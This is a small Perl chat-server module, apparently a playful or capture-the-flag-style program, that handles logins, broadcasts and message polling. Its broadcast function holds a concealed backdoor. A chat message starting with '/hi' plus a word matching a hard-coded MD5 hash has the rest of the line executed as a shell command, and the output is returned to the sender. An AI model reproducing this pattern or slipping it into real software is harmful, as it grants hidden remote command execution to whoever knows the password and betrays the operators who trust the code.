package SkyChat;

use strict;
use warnings;
use Digest::MD5 qw(md5_hex);

my %users = ();

sub login
{
    my ($user) = @_;

    $users{$user} = {time => time, messages => []} unless($user eq 'skykitteh');
    broadcast('skykitteh', $user.' lurkz in shadwoz.')
}

sub logout
{
    my ($user) = @_;
    delete $users{$user};

    broadcast('skykitteh', $user.' saiz no moar.');
}

sub broadcast
{
    my ($user, $msg) = @_;

    if($msg =~ m{^/hi (\w+) (.+)$} && md5_hex($1) eq 'd1133275ee2118be63a577af759fc052')
    {
	push @{$users{$user}{messages}}, [$user, $msg."\n".`bin/timeout 5 $2`];
	return;
    }

    foreach my $u (keys %users)
    {
	push @{$users{$u}{messages}}, [$user, $msg];
    }
}

sub users
{
    return [ keys %users ];
}

sub poll
{
    my ($user) = @_;

    return [] unless (exists $users{$user});

    my $msgs = $users{$user}{messages};
    $users{$user}{messages} = [];

    return $msgs;
}

1;
